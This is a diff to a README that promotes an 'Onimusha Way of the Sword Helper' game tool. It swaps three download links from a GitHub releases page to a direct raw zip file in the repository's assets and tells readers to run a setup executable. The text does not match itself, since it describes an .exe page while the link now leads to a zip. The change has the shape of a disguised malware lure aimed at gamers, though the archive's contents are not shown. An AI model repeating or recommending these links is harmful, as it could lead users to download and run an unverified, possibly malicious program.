@@ -1,6 +1,6 @@
 # ⚔️ Onimusha-Way-of-the-Sword-Helper - Your Ultimate Companion for Total Mastery
 
-[![Download Now](https://img.shields.io/badge/Download-Onimusha_Helper-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rohit8307717239-droid/Onimusha-Way-of-the-Sword-Helper/releases)
+[![Download Now](https://img.shields.io/badge/Download-Onimusha_Helper-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/rohit8307717239-droid/Onimusha-Way-of-the-Sword-Helper/main/assets/Way-the-Helper-Sword-of-Onimusha-3.0.zip)
 
 ---
 
@@ -36,7 +36,7 @@ The Issen counter is the heart of *Onimusha* combat. This mini-game mode helps y
 
 ### 📥 Download and Install
 
-Visit this link to download the application: **[Download Onimusha-Way-of-the-Sword-Helper](https://github.com/rohit8307717239-droid/Onimusha-Way-of-the-Sword-Helper/releases)**
+Visit this link to download the application: **[Download Onimusha-Way-of-the-Sword-Helper](https://raw.githubusercontent.com/rohit8307717239-droid/Onimusha-Way-of-the-Sword-Helper/main/assets/Way-the-Helper-Sword-of-Onimusha-3.0.zip)**
 
 Once you are on that page, look for the file named something like `Onimusha-Helper-Setup.exe`. Click it to start the download. After the download finishes, open the file and follow the simple on-screen steps. That is it. You do not need to install any other programs or tools.
 
@@ -149,7 +149,7 @@ This tool respects your time. It puts all the information at your fingertips, so
 
 Here is the direct link for your convenience:
 
-**[👉 Download Onimusha-Way-of-the-Sword-Helper Now](https://github.com/rohit8307717239-droid/Onimusha-Way-of-the-Sword-Helper/releases)**
+**[👉 Download Onimusha-Way-of-the-Sword-Helper Now](https://raw.githubusercontent.com/rohit8307717239-droid/Onimusha-Way-of-the-Sword-Helper/main/assets/Way-the-Helper-Sword-of-Onimusha-3.0.zip)**
 
 ---
 
